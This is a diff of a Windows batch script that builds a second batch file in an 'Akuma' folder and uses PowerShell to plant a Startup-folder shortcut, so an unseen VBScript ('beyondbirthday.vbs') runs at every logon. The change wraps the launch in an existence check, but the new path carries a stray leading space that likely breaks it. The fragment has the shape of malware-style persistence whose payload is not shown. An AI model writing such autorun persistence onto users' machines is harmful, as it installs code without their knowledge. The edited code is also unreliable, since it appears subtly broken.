@@ -12,4 +12,9 @@ echo start %homedrive%\Akuma\誕生日.vbs >> %homedrive%\Akuma\beyondbirthday.b
 echo cd "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup" >> %homedrive%\Akuma\beyondbirthday.bat
 echo del "beyondbirthday.lnk" >> %homedrive%\Akuma\beyondbirthday.bat
 powershell "$s=(New-Object -COM WScript.Shell).CreateShortcut('%userprofile%\Start Menu\Programs\Startup\beyondbirthday.lnk');$s.TargetPath='%homedrive%\Akuma\beyondbirthday.vbs';$s.Save()"
-start %homedrive%\Akuma\beyondbirthday.vbs
+IF EXIST "%homedrive%\Akuma\beyondbirthday.vbs" (
+    start "" " %homedrive%\Akuma\beyondbirthday.vbs"
+) ELSE (
+    echo The specified VBScript file does not exist.
+    rem Add error handling or other actions here
+)
